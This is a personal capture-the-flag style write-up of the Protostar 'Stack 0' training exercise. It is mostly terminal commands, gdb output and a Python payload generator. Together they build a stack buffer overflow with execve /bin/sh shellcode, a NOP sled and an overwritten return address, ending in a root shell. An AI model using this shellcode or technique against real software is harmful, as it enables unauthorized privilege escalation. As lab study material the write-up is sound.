{{ Exploit Exercises: Protostar - 0x01 - Stack 0

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack0/
        About:
        This level introduces the concept that memory can be accessed outside of its allocated region, how the stack
        variables are laid out, and that modifying outside of the allocated memory can modify program execution.

    }}

    [x] {{ Intended Solution

        # First I tried just a single character to see what happened
        user@protostar:/opt/protostar/bin$ ./stack0
        f
        Try again?

        # Since I knew this was a stack overflow vulnerability I sent it a string that contains a larger number of bytes
        # than was allocated to it.
        user@protostar:/opt/protostar/bin$ printf 'A%.0s' {1..100} | ./stack0
        you have changed the 'modified' variable
        Segmentation fault

    }}

    [x] {{ Root shell

        # First I find out how many bytes I have to overwrite before I hit EIP
        > ./pattern.py -c 100
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

        user@protostar:~$ printf Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 > stack0

        user@protostar:/opt/protostar/bin$ gdb stack0 -q
        Reading symbols from /opt/protostar/bin/stack0...done.

        (gdb) r < ~/stack0
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0x37634136 in ?? ()

        > ./pattern.py -ol 37634136
        [+] Offset found at 80 bytes

        # This means there's 80 bytes before the EIP. Next I need to verify that this is correct
        user@protostar:~$ python -c 'print "A"*80 + "BBBB"' > stack0

        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

        (gdb) i r eip
        eip            0x42424242   0x42424242

        # I can now start building the actual payload, but first I must find a shellcode to use.
        > ./searchsploit /bin/sh
        ....
        Linux x86 - execve /bin/sh - 21 bytes | /lin_x86/shellcode/13628.c
        ....

        > cat platforms/lin_x86/shellcode/13628.c
        /* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
          ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
          thanks : `ivan, milo, #oldschool crew
        */

        int main(){

        char sc[] = "\x6a\x0b" // push byte +0xb
        "\x58" // pop eax
        "\x99" // cdq
        "\x52" // push edx
        "\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
        "\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
        "\x89\xe3" // mov ebx, esp
        "\x31\xc9" // xor ecx, ecx
        "\xcd\x80"; // int 0x80

        ((void (*)()) sc)();
        }

        /*
        sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
        */

        --
        ipv

        # Python script to generate payload
        #!/usr/bin/env python

        shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
        nopsled = "\x90"*(80 - len(shellcode))
        eip = "BBBB"

        payload = nopsled + shellcode + eip
        print payload

        user@protostar:~$ python stack0.py > stack0

        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

        (gdb) x/80x $esp-150
        ....
        0xbffff75a: 0x186eb7ff  0x7ff4b7f0  0x6165b7fd  0xf778b7ec
        0xbffff76a: 0x9090bfff  0x90909090  0x90909090  0x90909090
        0xbffff77a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79a: 0x90909090  0x90909090  0x90909090  0x580b6a90
        0xbffff7aa: 0x2f685299  0x6868732f  0x6e69622f  0xc931e389
        ....

        # Changing value of eip in the Python script from BBBB to \x7a\xf7\xff\xbf
        user@protostar:~$ python stack0.py > stack0

        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0xbffff7b6 in ?? ()

        (gdb) x/80x $esp-150
        ....
        0xbffff76e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff77e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79e: 0x90909090  0x90909090  0x580b6a90  0x2f685299
        0xbffff7ae: 0x6868732f  0x622f622f  0x2f2f6e69  0x00006873
        ....

        # Addresses has changed. Changing value of eip in the Python script from \x7a\xf7\xff\xbf to \x6e\xf7\xff\xbf
        user@protostar:~$ python stack0.py > stack0

        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0xbffff7b6 in ?? ()

        (gdb) x/80x $esp-150
        ....
        0xbffff76e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff77e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79e: 0x90909090  0x90909090  0x580b6a90  0x2f685299
        0xbffff7ae: 0x6868732f  0x622f622f  0x2f2f6e69  0x00006873
        ....

        # Still not working. Trying to move ret to the next address in the nopsled making it point to \x7e\xf7\xff\xbf
        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable

        Program received signal SIGSEGV, Segmentation fault.
        0xbffff7b6 in ?? ()

        (gdb) x/80x $esp-150
        ....
        0xbffff76e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff77e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78e: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79e: 0x90909090  0x90909090  0x580b6a90  0x2f685299
        ....

        # Again the same result. WHY!? Heading out - Hopefully fresh air will help I remembered a talk I had with
        # barrebas a while back where he mentioned how I could increase the buffer size. After asking Google some
        # questions I found an write-up on Protostar Stack5 here http://staringintodevnull.blogspot.no/2014/02/protostar-stack5-writeup.html
        # which used this same method. The magic bytes are \x83\xec\x7f. So, time to update the Python script.

        shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
        ... becomes ...
        shellcode = "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

        # Running the payload with the updated shellcode
        (gdb) r < ~/stack0
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack0 < ~/stack0
        you have changed the 'modified' variable
        Executing new program: /bin/dash

        Program exited normally.

        # Awesome! Now, let's see how it performs outside gdb
        user@protostar:/opt/protostar/bin$ cat /home/user/stack0 | ./stack0
        you have changed the 'modified' variable
        Segmentation fault

        user@protostar:/opt/protostar/bin$ (cat /home/user/stack0; cat) | ./stack0
        you have changed the 'modified' variable
        whoami
        Segmentation fault

        # Time to check core dump.
        user@protostar:/opt/protostar/bin$ cp stack0 /tmp
        user@protostar:/opt/protostar/bin$ cd /tmp/
        user@protostar:/tmp$ cat /home/user/stack0 | ./stack0
        you have changed the 'modified' variable
        Segmentation fault

        # No core dump? Oh, ulimit!
        user@protostar:/tmp$ ulimit -c unlimited
        user@protostar:/tmp$ cat /home/user/stack0 | ./stack0
        you have changed the 'modified' variable
        Segmentation fault (core dumped)

        # Goodie. Let's solve this!
        user@protostar:/tmp$ gdb stack0 core.11.stack0.1841 -q
        Reading symbols from /tmp/stack0...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack0'.
        Program terminated with signal 11, Segmentation fault.
        #0  0xbffff781 in ?? ()

        (gdb) x/80x $esp-150
        ....
        0xbffff7aa: 0x9090bfff  0x90909090  0x90909090  0x90909090
        0xbffff7ba: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7ca: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7da: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # Update the eip in the Python script to \xaa\xf7\xff\xbf and try this again
        user@protostar:/tmp$ cd /opt/protostar/bin/
        user@protostar:/opt/protostar/bin$ (cat /home/user/stack0; cat) | ./stack0
        you have changed the 'modified' variable
        whoami
        Illegal instruction

        # Still crashes but it's progress. Let's try the next address
        user@protostar:/opt/protostar/bin$ (cat /home/user/stack0; cat) | ./stack0
        you have changed the 'modified' variable
        whoami
        root
        id
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
    }}

    [~] {{ What did I learn?

        → Append these three bytes, \x83\xec\x7f, to the shellcode to get more space for the payload
        → If payload results in "Illegal Instruction", try another address
        → Core Dump
            → If the program does not dump core, the command "ulimit -c unlimited" enables core dump
            → Use core dump with the program in gdb to fix differences in memory addresses inside and outside gdb
            → The program must be executed from inside a directory writable to the current user

    }}

}}